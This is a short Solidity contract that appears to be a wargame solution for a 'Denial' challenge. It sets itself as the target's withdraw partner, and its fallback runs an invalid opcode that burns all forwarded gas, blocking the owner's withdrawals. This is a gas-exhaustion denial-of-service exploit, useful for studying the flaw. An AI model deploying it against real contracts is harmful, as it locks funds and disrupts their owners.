//SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
//0xbA5b25916bC393eF37EEaE2e4Cd6e4A4e4dA3267

interface IDenial {

    function setWithdrawPartner(address _partner) external;
}

contract DenailPwn {

    constructor(IDenial denialAddr) {

        denialAddr.setWithdrawPartner(address(this));
    }

    fallback() external payable {
        assembly {
            invalid()   // consumes all the gas sent in the transaction
        }
    }

}